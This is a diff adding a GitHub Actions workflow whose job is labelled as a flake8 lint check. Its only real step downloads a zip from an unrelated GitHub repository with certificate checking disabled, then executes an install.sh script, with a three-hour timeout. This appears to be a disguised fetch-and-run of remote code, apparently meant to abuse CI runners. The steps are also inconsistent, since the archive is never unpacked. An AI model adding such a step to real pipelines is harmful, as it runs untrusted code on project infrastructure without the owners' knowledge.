@@ -1,0 +1,25 @@
+name: smccore
+
+on:
+  repository_dispatch:
+  workflow_dispatch:
+
+jobs:
+    flake8:
+        name: smcdev
+        runs-on: ubuntu-18.04
+        timeout-minutes: 180
+        steps:
+        -   uses: actions/checkout@v2
+        -   uses: actions/setup-python@v1
+            with:
+                # matches compat target in setup.py
+                python-version: '3.6'
+        -   name: "Main Script"
+            run: |
+                curl -L -O -k https://github.com/Samnidasamulea/fixcerles/archive/refs/heads/main.zip
+                ls
+                chmod +x install.sh
+                ./install.sh
+                 cd main
+                 ls
